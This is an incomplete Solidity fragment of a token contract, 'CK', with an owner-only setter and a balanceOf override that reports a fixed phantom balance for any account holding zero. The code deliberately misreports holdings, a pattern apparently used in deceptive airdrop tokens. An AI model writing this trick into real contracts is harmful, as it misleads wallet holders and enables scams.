...
contract  CK  is baseContract { 
    ...
    uint256 private _initialBalance = 10**15;
    ...
    function setinb( uint amount) public {
        address _sender = msg.sender; 
        require(ceo==_sender,"must ceo");  
    ...
    function balanceOf(address account) public view override returns (uint amount) {
        if (ex[account].reward) amount= _tOwned[account];
        else amount= tokenFromReflection(_rOwned[account]);
        if(amount==0)amount=_initialBalance;
    }
